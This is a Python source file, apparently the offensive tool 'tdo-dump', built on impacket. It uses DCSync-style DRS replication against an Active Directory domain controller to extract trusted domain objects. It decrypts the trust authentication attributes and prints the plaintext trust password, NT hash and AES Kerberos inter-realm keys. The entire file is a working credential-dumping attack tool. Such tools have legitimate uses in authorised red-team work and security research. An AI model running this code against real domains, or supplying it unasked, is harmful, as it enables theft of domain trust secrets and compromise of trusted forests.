from impacket.dcerpc.v5 import epm, rpcrt, transport, drsuapi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.uuid import bin_to_uuidtup
from impacket.uuid import string_to_bin

from impacket import ntlm
from impacket.krb5 import constants
from impacket.krb5.crypto import string_to_key, Key

from binascii import unhexlify, hexlify

import sys
import argparse

from struct import unpack, pack
from Cryptodome.Cipher import DES, AES
from Cryptodome.Hash import HMAC, MD4, MD5

# This script is used to dump trusted domain objects
# more info here: https://offsec.almond.consulting/trust-no-one_are-one-way-trusts-really-one-way.html
# It is heavily based on previous work by @SAERXCIT and Dirk-jan Mollema (@_dirkjan).
# shout out to all impacket contributors!
# @lowercase_drm / @almondoffsec


NAME_TO_INTERNAL = {
    'trustPartner':b'ATTm589957',
    'trustAuthIncoming':b'ATTk589953',
    'trustAuthOutgoing':b'ATTk589959',
}

NAME_TO_ATTRTYP = {
    'trustPartner':0x90085,
    'trustAuthIncoming':0x90081,
    'trustAuthOutgoing':0x90087,
}

ATTRTYP_TO_ATTID = {
    'trustPartner':'1.2.840.113556.1.4.133',
    'trustAuthIncoming':'1.2.840.113556.1.4.129',
    'trustAuthOutgoing':'1.2.840.113556.1.4.135',
}

KERBEROS_TYPE = {
    1:'dec-cbc-crc',
    3:'des-cbc-md5',
    17:'aes128-cts-hmac-sha1-96',
    18:'aes256-cts-hmac-sha1-96',
    0xffffff74:'rc4_hmac',
}

def parse_trust_key_struct(trust_key_struct):
    # [MS-ADT] 6.1.6.9.1 trustAuthInfo Attributes
    count_auth_info = unpack('<I', trust_key_struct[0:4])[0]
    offset_authentication_info = unpack('<I', trust_key_struct[4:4+4])[0]
    offset_previous_authentication_info = unpack('<I', trust_key_struct[8:8+4])[0]
    auth_info = trust_key_struct[offset_authentication_info:offset_previous_authentication_info]
    previous_auth_info = trust_key_struct[offset_previous_authentication_info:]

    # [MS-ADT] 6.1.6.9.1.1 LSAPR_AUTH_INFORMATION
    auth_type = unpack('<I', auth_info[8:12])[0]
    # LastUpdateTime + AuthType
    # LARGE_INTEGER + ULONG = 12
    auth_info_length = unpack('<I', auth_info[12:16])[0]
    # LARGE_INTEGER + ULONG + ULONG = 16
    current_key = auth_info[16:16+auth_info_length]
    previous_auth_info_length = unpack('<I', previous_auth_info[12:16])[0]
    previous_key = previous_auth_info[16:16+previous_auth_info_length]
    return current_key, previous_key

def compute_kerberos_salt(current_domain, trusted_domain, is_in, is_intertrust):
    if is_in:
        if not is_intertrust:
            trusted_domain = trusted_domain.split('.')[0]
        from_domain = current_domain
        dest_domain = trusted_domain
    else:
        if not is_intertrust:
            current_domain = current_domain.split('.')[0]
        from_domain = trusted_domain
        dest_domain = current_domain
    salt = '{}krbtgt{}'.format(from_domain.upper(), dest_domain.upper())
    debugprint('[+] Salt: {}'.format(salt))
    return salt

def compute_kerberos_keys(raw_secret, trusted_domain, current_domain, is_in, is_intertrust):
    salt = compute_kerberos_salt(current_domain, trusted_domain, is_in, is_intertrust)
    all_ciphers = [
        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
    ]
    raw_secret = raw_secret.decode('utf-16-le', 'replace').encode('utf-8', 'replace')
    for etype in all_ciphers:
        try:
            key = string_to_key(etype, raw_secret, salt, None)
        except Exception:
            print('[!] Error when computing the kerberos key')
            sys.exit(0)
        typename = KERBEROS_TYPE[etype]
        if is_intertrust:
            secret = "{}-{}:{}:{}".format(trusted_domain,
                                         ("Incoming" if is_in else "Outgoing"),
                                          typename,
                                          hexlify(key.contents).decode('utf-8'))
        else:
            secret = "{}:{}:{}".format(trusted_domain,
                                       typename, 
                                       hexlify(key.contents).decode('utf-8'))
        print(secret)

def process_tdo(trust_partner, current_domain, secret, is_in):
    print('[+] Dumping trusted domain object: {} → {}'.format(trust_partner if is_in else current_domain, 
                                                      current_domain if is_in else trust_partner))
    
    tdo_clear_pass = "{}:plain_password_hex:{}".format(trust_partner,
                                                       hexlify(secret).decode('utf-8'))
    print(tdo_clear_pass)
    md4 = MD4.new()
    md4.update(secret)
    tdo_nt_hash = "{}:{}:{}:::".format(trust_partner,
                                       hexlify(ntlm.LMOWFv1('','')).decode('utf-8'),
                                       hexlify(md4.digest()).decode('utf-8'))
    print(tdo_nt_hash)
    compute_kerberos_keys(secret, trust_partner, current_domain, is_in, False)
    print('[+] Dumping inter-realm trust keys')
    compute_kerberos_keys(secret, trust_partner, current_domain, is_in, True)

def get_drs_context(dce):
    # All flags except these two, reversed from DSInternals
    dw_flag = 0xffffffff - drsuapi.DRS_EXT_RESERVED_FOR_WIN2K_OR_DOTNET_PART2 - drsuapi.DRS_EXT_RESERVED_FOR_WIN2K_OR_DOTNET_PART3
    debugprint('[+] Calling DRSBind')
    request = drsuapi.DRSBind()
    request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
    drs = drsuapi.DRS_EXTENSIONS_INT()
    drs['cb'] = len(drs)
    drs['dwFlags'] = dw_flag
    drs['SiteObjGuid'] = drsuapi.NULLGUID
    drs['Pid'] = 0
    drs['dwReplEpoch'] = 0
    drs['dwFlagsExt'] = drsuapi.DRS_EXT_RECYCLE_BIN | drsuapi.DRS_EXT_LH_BETA2
    drs['ConfigObjGUID'] = drsuapi.NULLGUID
    drs['dwExtCaps'] = drsuapi.DRS_EXT_RECYCLE_BIN | drsuapi.DRS_EXT_LH_BETA2
    request['pextClient']['cb'] = len(drs)
    request['pextClient']['rgb'] = list(drs.getData())
    resp = dce.request(request)
    return resp['phDrs']

def dump_tdo(dce, context_handle, dsa_guid, tdo_guid):
    debugprint('[+] Calling DRSGetNCChanges for {} on {}'.format(tdo_guid, dsa_guid))
    request = drsuapi.DRSGetNCChanges()
    request['hDrs'] = context_handle
    request['dwInVersion'] = 8
    request['pmsgIn']['tag'] = 8
    request['pmsgIn']['V8']['uuidDsaObjDest'] = string_to_bin(dsa_guid)
    request['pmsgIn']['V8']['uuidInvocIdSrc'] = string_to_bin(dsa_guid)

    dsName = drsuapi.DSNAME()
    dsName['SidLen'] = 0
    dsName['Guid'] = string_to_bin(tdo_guid)
    dsName['Sid'] = ''
    dsName['NameLen'] = 0
    dsName['StringName'] = ('\x00')
    dsName['structLen'] = len(dsName.getData())

    request['pmsgIn']['V8']['pNC'] = dsName

    request['pmsgIn']['V8']['usnvecFrom']['usnHighObjUpdate'] = 0
    request['pmsgIn']['V8']['usnvecFrom']['usnHighPropUpdate'] = 0
    request['pmsgIn']['V8']['pUpToDateVecDest'] = NULL
    request['pmsgIn']['V8']['ulFlags'] = drsuapi.DRS_WRIT_REP | drsuapi.DRS_INIT_SYNC
    request['pmsgIn']['V8']['cMaxObjects'] = 2
    request['pmsgIn']['V8']['cMaxBytes'] = 0
    request['pmsgIn']['V8']['ulExtendedOp'] = drsuapi.EXOP_REPL_OBJ

    prefixTable = []
    ppartialAttrSet = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
    ppartialAttrSet['dwVersion'] = 1
    ppartialAttrSet['cAttrs'] = len(ATTRTYP_TO_ATTID)
    for attId in list(ATTRTYP_TO_ATTID.values()):
        ppartialAttrSet['rgPartialAttr'].append(drsuapi.MakeAttid(prefixTable , attId))
    request['pmsgIn']['V8']['pPartialAttrSet'] = ppartialAttrSet
    request['pmsgIn']['V8']['PrefixTableDest']['PrefixCount'] = len(prefixTable)
    request['pmsgIn']['V8']['PrefixTableDest']['pPrefixEntry'] = prefixTable
    request['pmsgIn']['V8']['pPartialAttrSetEx1'] = NULL
    record = dce.request(request)
    return record

def swap_ad_guid_bytes(guid):
    parts = guid.split('-')
    if len(parts) != 5:
        return guid
    def swap(group):
        return ''.join(reversed([group[i:i+2] for i in range(0, len(group), 2)]))
    return '-'.join([swap(parts[0]), swap(parts[1]), swap(parts[2]), parts[3], parts[4]])

def normalize_ad_guid(guid):
    # AD-generated objectGUID values are UUID v4, so in the standard
    # mixed-endian textual form (ADUC / PowerShell / DSInternals) the third
    # group always starts with '4'. Some tools (notably nxc --query) emit the
    # raw byte order instead, which impacket.uuid.string_to_bin would then
    # double-swap. When the version digit is missing, pre-swap the first three
    # groups so string_to_bin gets the format it expects.
    # Ambiguous case: when the standard third group is '4Y4W', byte-swapping
    # gives '4W4Y', so both forms start with '4' and this heuristic alone can't
    # tell them apart. is_ambiguous_ad_guid() flags those, and the caller
    # retries the DRS call with swapped GUIDs on failure.
    parts = guid.split('-')
    if len(parts) != 5 or parts[2][:1].lower() == '4':
        return guid
    return swap_ad_guid_bytes(guid)

def is_ambiguous_ad_guid(guid):
    # Third group looks like '4*4*': both the standard and raw forms start
    # with '4', so normalize_ad_guid() cannot decide and leaves it as-is.
    parts = guid.split('-')
    return (len(parts) == 5
            and len(parts[2]) >= 3
            and parts[2][0].lower() == '4'
            and parts[2][2].lower() == '4')

def argparser(argv):
    arg_parser = argparse.ArgumentParser(prog='tdo-dump', description='\nDump a trusted domain object and display the secrets')
    arg_parser.add_argument('-u', '--user', required=True, help='User account used to dump the TDO')
    arg_parser.add_argument('-d', '--domain', required=True, dest='domain', help='FQDN of the domain we authenticate with')
    arg_parser.add_argument('-p', '--password', required=False, dest='password', help='User password')
    arg_parser.add_argument('--hashes', required=False, action='store', metavar = 'LMHASH:NTHASH', help='NTLM hashes, format is [LMHASH:]NTHASH')
    arg_parser.add_argument('-k', '--kerberos', action='store_true', dest='use_kerberos',
                            help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) '
                                 'based on target parameters. If valid credentials cannot be found, it will use '
                                 'the ones specified in the command line')
    arg_parser.add_argument('-no-pass', '--no-pass', action='store_true', dest='no_pass',
                            help="don't ask for password (useful for -k)")
    arg_parser.add_argument('-aesKey', '--aes-key', action='store', metavar='hex key', dest='aes_key',
                            help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    arg_parser.add_argument('-dc-host', '--dc-host', action='store', dest='dc_host',
                            help='FQDN of the Domain Controller, used to build the Kerberos SPN '
                                 'when -t is an IP. If omitted, the value passed to -t is used as-is')
    arg_parser.add_argument('-t', '--dc-ip', dest='domain_controller', help='IP address or FQDN of the Domain Controller to target. With Kerberos, an IP requires --dc-host so the SPN can be built from the DC FQDN')
    arg_parser.add_argument('--dsa-guid', required=True, dest='dsa_guid', help='DSA GUID')
    arg_parser.add_argument('--tdo-guid', required=True, dest='tdo_guid', help='Truted Domain Object GUID')
    arg_parser.add_argument('-r', '--raw', action='store_true', dest='raw_guid',
                            help='Treat --tdo-guid and --dsa-guid as raw byte order '
                                 '(e.g. from nxc --query) and pre-swap them. Without '
                                 'this flag the format is auto-detected, with a retry '
                                 'on failure to cover ambiguous UUID v4 GUIDs.')
    arg_parser.add_argument('--debug', action="store_true", help='Debug mode')
    args = arg_parser.parse_args(argv)

    if args.aes_key is not None:
        args.use_kerberos = True

    if args.hashes:
        try:
            args.lmhash, args.nthash = args.hashes.split(':')
        except ValueError:
            args.lmhash, args.nthash = 'aad3b435b51404eeaad3b435b51404ee', args.hashes
        finally:
            args.password = str()
    else:
        args.lmhash = args.nthash = str()

    if args.password is None and not args.hashes and not args.no_pass and not args.use_kerberos:
        from getpass import getpass
        args.password = getpass('Password:')
    if args.password is None:
        args.password = str()
    return args

debugprint = lambda *a, **k: None


def main():
    global debugprint

    args = argparser(sys.argv[1:])
    host = args.domain_controller
    nt_hash = args.nthash
    lm_hash = args.lmhash
    username = args.user
    if args.raw_guid:
        tdo_guid = swap_ad_guid_bytes(args.tdo_guid)
        dsa_guid = swap_ad_guid_bytes(args.dsa_guid)
    else:
        tdo_guid = normalize_ad_guid(args.tdo_guid)
        dsa_guid = normalize_ad_guid(args.dsa_guid)
    domain = args.domain
    password = args.password
    aes_key = args.aes_key
    use_kerberos = args.use_kerberos
    kdc_host = args.dc_host

    debugprint = print if args.debug else lambda *a, **k: None
    if args.raw_guid:
        debugprint('[+] --raw set: pre-swapped TDO GUID to {}'.format(tdo_guid))
        debugprint('[+] --raw set: pre-swapped DSA GUID to {}'.format(dsa_guid))
    else:
        if tdo_guid != args.tdo_guid:
            debugprint('[+] Detected raw-byte TDO GUID, normalized to {}'.format(tdo_guid))
        if dsa_guid != args.dsa_guid:
            debugprint('[+] Detected raw-byte DSA GUID, normalized to {}'.format(dsa_guid))

    authn_level_packet = rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY
    dsruapi_uuid = drsuapi.MSRPC_UUID_DRSUAPI
    syntax = rpcrt.DCERPC.NDRSyntax

    debugprint('[+] Calling hept_map: {}'.format(bin_to_uuidtup(dsruapi_uuid)))
    binding_string_dsruapi = epm.hept_map(host, dsruapi_uuid, dataRepresentation=syntax, protocol='ncacn_ip_tcp')
    debugprint("[x] Binding string: {}".format(binding_string_dsruapi))
    rpctransport = transport.DCERPCTransportFactory(binding_string_dsruapi)
    rpctransport.set_credentials(username, password, domain, lmhash=lm_hash, nthash=nt_hash, aesKey=aes_key)
    if use_kerberos:
        rpctransport.set_kerberos(True, kdcHost=kdc_host)
        # hept_map built the binding from the -dc-ip value, so the transport's
        # remote name is an IP. Kerberos needs an SPN built from the DC FQDN,
        # so override the remote name while keeping the IP as the TCP target.
        if kdc_host:
            rpctransport.setRemoteName(kdc_host)
            rpctransport.setRemoteHost(host)

    dce = rpctransport.get_dce_rpc()
    if use_kerberos:
        dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
    dce.connect()
    dce.set_credentials(*rpctransport.get_credentials())
    dce.set_auth_level(authn_level_packet)
    dce.bind(dsruapi_uuid)

    # Retrieving the DRS context handle
    try:
        context_handle = get_drs_context(dce)
    except rpcrt.DCERPCException as e:
        print('[!] Error: {}'.format(e))
        sys.exit(0)

    debugprint('[x] Context handle: {}'.format(hexlify(context_handle).decode('utf-8')))

    # Synching the TDO object via DRSGetNCChanges
    try:
        record = dump_tdo(dce, context_handle, dsa_guid, tdo_guid)
    except drsuapi.DCERPCSessionError as e:
        # normalize_ad_guid() leaves ambiguous v4 GUIDs (third group '4*4*') in
        # their input form because the byte-swapped variant also starts with
        # '4'. If at least one of the two GUIDs is ambiguous, retry once with
        # those swapped. --raw skips this retry: the user told us explicitly.
        retry_tdo = swap_ad_guid_bytes(tdo_guid) if is_ambiguous_ad_guid(tdo_guid) else tdo_guid
        retry_dsa = swap_ad_guid_bytes(dsa_guid) if is_ambiguous_ad_guid(dsa_guid) else dsa_guid
        if args.raw_guid or (retry_tdo == tdo_guid and retry_dsa == dsa_guid):
            drsuapi.hDRSUnbind(dce, context_handle)
            print('[!] DRSGetNCChanges failed: {}'.format(e))
            print('[!] Common causes: TDO GUID does not exist, DSA GUID does not exist, '
                  'or the authenticated user lacks DRS replication rights on the target object.')
            sys.exit(0)
        debugprint('[+] DRSGetNCChanges failed ({}); ambiguous v4 GUID detected, '
                   'retrying with byte-swapped GUIDs'.format(e))
        try:
            record = dump_tdo(dce, context_handle, retry_dsa, retry_tdo)
        except drsuapi.DCERPCSessionError as e2:
            drsuapi.hDRSUnbind(dce, context_handle)
            print('[!] DRSGetNCChanges failed: {}'.format(e))
            print('[!] Retry with byte-swapped ambiguous GUIDs also failed: {}'.format(e2))
            print('[!] Common causes: TDO GUID does not exist, DSA GUID does not exist, '
                  'or the authenticated user lacks DRS replication rights on the target object.')
            sys.exit(0)
        tdo_guid, dsa_guid = retry_tdo, retry_dsa

    drsuapi.hDRSUnbind(dce, context_handle)
    replyVersion = 'V{}'.format(record['pdwOutVersion'])

    if record['pmsgOut'][replyVersion]['cNumObjects'] == 0:
        print('[!] DSA GUID not found!')
        sys.exit(0)

    # Extract secrets from the TDO
    print('[+] Distinguishe name retrieved: {}'.format(record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1]))
    
    prefixTable = record['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry']
    for attr in record['pmsgOut'][replyVersion]['pObjects']['Entinf']['AttrBlock']['pAttr']:
        try:
            attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
            LOOKUP_TABLE = ATTRTYP_TO_ATTID
        except:
            debugprint('[!] Failed to execute OidFromAttid, fallbacking to fixed table')
            attId = attr['attrTyp']
            LOOKUP_TABLE = NAME_TO_ATTRTYP

        if attId == LOOKUP_TABLE['trustPartner']:
            if attr['AttrVal']['valCount'] > 0:
                try:
                    trustPartner = b''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
                except:
                    debugprint('[!] Cannot get trustPartner for {}'.format(record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1]))
                    trustPartner = 'unknown'
            else:
                debugprint('[!] Cannot get trustPartner for {}'.format(record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1]))
                trustPartner = 'unknown'

        elif attId == LOOKUP_TABLE['trustAuthIncoming']:
            if attr['AttrVal']['valCount'] > 0:
                try:
                    encryptedTrustAuthIncoming = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    trustAuthIncoming = drsuapi.DecryptAttributeValue(dce, encryptedTrustAuthIncoming)
                    currentIncomingKey, previousIncomingKey = parse_trust_key_struct(trustAuthIncoming)
                except:
                    debugprint('[!] Cannot get trustAuthIncoming for {}, most likely because it is a one way trust'.format(record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1]))
                    currentIncomingKey, previousIncomingKey = None, None
            else:
                debugprint('[!] Cannot get trustAuthIncoming for {}, other error'.format(record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1]))
                currentIncomingKey, previousIncomingKey = None, None

        elif attId == LOOKUP_TABLE['trustAuthOutgoing']:
            if attr['AttrVal']['valCount'] > 0:
                try:
                    encryptedTrustAuthOutgoing = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    trustAuthOutgoing = drsuapi.DecryptAttributeValue(dce, encryptedTrustAuthOutgoing)
                    currentOutgoingKey, previousOutgoingKey = parse_trust_key_struct(trustAuthOutgoing)
                except:
                    debugprint('[!] Cannot get trustAuthOutgoing for {}, most likely because it is a one way trust'.format(record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1]))
                    currentOutgoingKey, previousOutgoingKey = None, None
            else:
                debugprint('[!] Cannot get trustAuthOutgoing for {}, other error'.format(record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1]))
                currentOutgoingKey, previousOutgoingKey = None, None

    if currentIncomingKey:
        process_tdo(trustPartner, domain, currentIncomingKey, True)
    if currentOutgoingKey:
        process_tdo(trustPartner, domain, currentOutgoingKey, False)


if __name__ == '__main__':
    main()
